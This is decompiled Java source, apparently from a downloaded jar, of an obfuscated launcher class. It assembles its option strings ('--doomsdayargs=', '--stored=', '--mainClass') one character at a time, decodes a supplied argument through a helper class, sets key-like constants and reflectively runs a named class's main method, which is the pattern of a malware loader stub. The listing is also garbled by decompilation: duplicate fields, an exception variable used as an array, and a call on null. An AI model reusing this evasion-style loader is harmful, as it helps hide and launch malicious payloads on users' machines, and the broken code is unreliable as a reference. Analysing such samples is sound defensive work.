package net.java;

public class y {
  public static String a = "/net/java/b";

  public static String b = "/net/java/c";

  public static long a = -4062297973245990737L;

  public static long b = -1083759330220665782L;

  public static void main(String[] paramArrayOfString) {
    String str1 = null;
    byte[] arrayOfByte = null;
    String[] arrayOfString = new String[paramArrayOfString.length];
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('-');
    stringBuilder.append('-');
    stringBuilder.append('d');
    stringBuilder.append('o');
    stringBuilder.append('o');
    stringBuilder.append('m');
    stringBuilder.append('s');
    stringBuilder.append('d');
    stringBuilder.append('a');
    stringBuilder.append('y');
    stringBuilder.append('a');
    stringBuilder.append('r');
    stringBuilder.append('g');
    stringBuilder.append('s');
    stringBuilder.append('=');
    String str2 = stringBuilder.toString();
    (stringBuilder = new StringBuilder()).append('-');
    stringBuilder.append('-');
    stringBuilder.append('s');
    stringBuilder.append('t');
    stringBuilder.append('o');
    stringBuilder.append('r');
    stringBuilder.append('e');
    stringBuilder.append('d');
    stringBuilder.append('=');
    String str3 = stringBuilder.toString();
    String str4 = null;
    if (paramArrayOfString != null && paramArrayOfString.length > 0) {
      byte b1 = 0;
      for (byte b2 = 0; b2 < paramArrayOfString.length; b2++) {
        (stringBuilder = new StringBuilder()).append('-');
        stringBuilder.append('-');
        stringBuilder.append('m');
        stringBuilder.append('a');
        stringBuilder.append('i');
        stringBuilder.append('n');
        stringBuilder.append('C');
        stringBuilder.append('l');
        stringBuilder.append('a');
        stringBuilder.append('s');
        stringBuilder.append('s');
        if (str1 == null && paramArrayOfString[b2].equalsIgnoreCase(stringBuilder.toString())) {
          str1 = paramArrayOfString[b2 + 1];
          b2++;
        } else if (paramArrayOfString[b2].startsWith(str2)) {
          String str = paramArrayOfString[b2].substring(str2.length());
          try {
            StringBuilder stringBuilder1;
            (stringBuilder1 = new StringBuilder()).append('U');
            stringBuilder1.append('T');
            stringBuilder1.append('F');
            stringBuilder1.append('-');
            stringBuilder1.append('8');
            arrayOfByte = l.a(str.getBytes(stringBuilder1.toString()));
          } catch (Exception exception) {
            throw new RuntimeException(exception);
          }
          if (b2 + 1 < exception.length && exception[b2 + 1].startsWith(str3)) {
            str4 = exception[b2 + 1].substring(str3.length());
            b2++;
          }
        } else {
          arrayOfString[b1++] = (String)exception[b2];
        }
      }
      String[] arrayOfString1 = new String[b1];
      for (byte b3 = 0; b3 < arrayOfString1.length; b3++)
        arrayOfString1[b3] = arrayOfString[b3];
      arrayOfString = arrayOfString1;
    }
    if (str1 != null) {
      l.b = a;
      l.a = b;
      l.b = a;
      l.a = b;
      l.a(new Object[] { arrayOfByte, Integer.valueOf(12), str4 });
      try {
        (stringBuilder = new StringBuilder()).append('m');
        stringBuilder.append('a');
        stringBuilder.append('i');
        stringBuilder.append('n');
        Class.forName(str1).getMethod(stringBuilder.toString(), new Class[] { String[].class }).invoke(null, new Object[] { arrayOfString });
        return;
      } catch (Exception exception) {
        null.printStackTrace();
      }
    }
  }
}


/* Location:              /Users/apple/Downloads/9z72uyksgx.jar!/net/java/y.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */